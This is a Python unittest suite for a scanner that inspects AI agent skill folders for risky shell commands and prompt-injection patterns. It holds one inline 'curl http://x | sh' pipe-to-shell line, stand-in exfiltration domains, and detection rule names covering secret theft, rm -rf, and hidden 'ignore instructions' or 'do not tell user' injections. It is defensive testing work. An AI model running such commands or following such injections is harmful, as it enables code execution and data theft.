"""Tests for skill_prescan.py (run: python3 -B -m unittest discover -s skills/subagent-pool/scripts -v)."""
import contextlib
import io
import json
import os
import shutil
import tempfile
import unittest

import skill_prescan as sp

HERE = os.path.dirname(os.path.abspath(__file__))
BENIGN = os.path.join(HERE, "fixtures", "skill-benign")
MALICIOUS = os.path.join(HERE, "fixtures", "skill-malicious")


def rules_of(findings):
    return {f["rule"] for f in findings}


class BenignFixtureTests(unittest.TestCase):
    def setUp(self):
        self.report = sp.scan(BENIGN)

    def test_report_shape(self):
        for key in ("version", "files", "executables", "scripts", "binaries", "urls", "domains",
                    "shell_risks", "injection_findings", "summary"):
            self.assertIn(key, self.report)
        for key in ("files", "executables", "scripts", "urls", "domains", "shell_risks", "injection_findings"):
            self.assertEqual(self.report["summary"][key], len(self.report[key]))

    def test_lists_files_relative_to_root(self):
        paths = {f["path"] for f in self.report["files"]}
        self.assertIn("SKILL.md", paths)
        self.assertIn("scripts/hello.sh", paths)

    def test_benign_has_no_risk_findings(self):
        self.assertEqual(self.report["shell_risks"], [])
        self.assertEqual(self.report["injection_findings"], [])
        self.assertEqual(self.report["urls"], [])
        self.assertEqual(self.report["binaries"], [])

    def test_executable_script_is_listed(self):
        self.assertIn("scripts/hello.sh", self.report["executables"])
        self.assertIn("scripts/hello.sh", self.report["scripts"])


class MaliciousFixtureTests(unittest.TestCase):
    def setUp(self):
        self.report = sp.scan(MALICIOUS)

    def test_shell_risks_detected(self):
        found = rules_of(self.report["shell_risks"])
        for rule in ("pipe-to-shell", "rm-rf", "eval", "base64-decode", "secret-env", "ssh-access"):
            self.assertIn(rule, found, rule)

    def test_injection_patterns_detected_in_markdown(self):
        found = rules_of(self.report["injection_findings"])
        for rule in ("ignore-instructions", "exfiltration-instruction", "hidden-html-comment",
                     "do-not-tell-user", "zero-width-chars"):
            self.assertIn(rule, found, rule)
        for finding in self.report["injection_findings"]:
            self.assertTrue(finding["file"].endswith(".md") or finding["rule"] == "zero-width-chars")

    def test_urls_and_domains_listed(self):
        self.assertIn("collector.example.net", self.report["domains"])
        self.assertIn("paste.example.org", self.report["domains"])
        self.assertTrue(any(u.startswith("https://paste.example.org") for u in self.report["urls"]))

    def test_non_executable_script_still_scanned(self):
        self.assertNotIn("helper/setup.sh", self.report["executables"])
        self.assertIn("helper/setup.sh", self.report["scripts"])
        self.assertTrue(any(f["file"] == "helper/setup.sh" for f in self.report["shell_risks"]))

    def test_findings_have_line_and_bounded_excerpt(self):
        for finding in self.report["shell_risks"] + self.report["injection_findings"]:
            self.assertIsInstance(finding["line"], int)
            self.assertGreaterEqual(finding["line"], 1)
            self.assertLessEqual(len(finding["excerpt"]), sp.MAX_EXCERPT)

    def test_summary_counts_match(self):
        self.assertGreater(self.report["summary"]["shell_risks"], 0)
        self.assertGreater(self.report["summary"]["injection_findings"], 0)


class SafetyTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def test_symlinks_are_reported_and_not_followed(self):
        outside = os.path.join(self.dir, "outside.txt")
        with open(outside, "w", encoding="utf-8") as f:
            f.write("TOP-SECRET-CONTENT-123\n")
        root = os.path.join(self.dir, "skill")
        os.mkdir(root)
        os.symlink(outside, os.path.join(root, "link.md"))
        report = sp.scan(root)
        self.assertTrue(any(f["path"] == "link.md" and f["symlink"] for f in report["files"]))
        self.assertIn("symlink", rules_of(report["injection_findings"] + report["shell_risks"]))
        self.assertNotIn("TOP-SECRET-CONTENT-123", json.dumps(report))

    def test_binary_files_are_listed_not_scanned(self):
        root = os.path.join(self.dir, "skill")
        os.mkdir(root)
        with open(os.path.join(root, "blob.bin"), "wb") as f:
            f.write(b"\x00\x01curl http://x | sh")
        report = sp.scan(root)
        self.assertIn("blob.bin", report["binaries"])
        self.assertEqual(report["shell_risks"], [])

    def test_cli_exit_codes(self):
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(sp.main(["skill_prescan.py", BENIGN]), 0)
        self.assertEqual(json.loads(out.getvalue())["version"], sp.REPORT_VERSION)
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(sp.main(["skill_prescan.py", os.path.join(self.dir, "missing")]), 2)
            self.assertEqual(sp.main(["skill_prescan.py"]), 2)


if __name__ == "__main__":
    unittest.main()
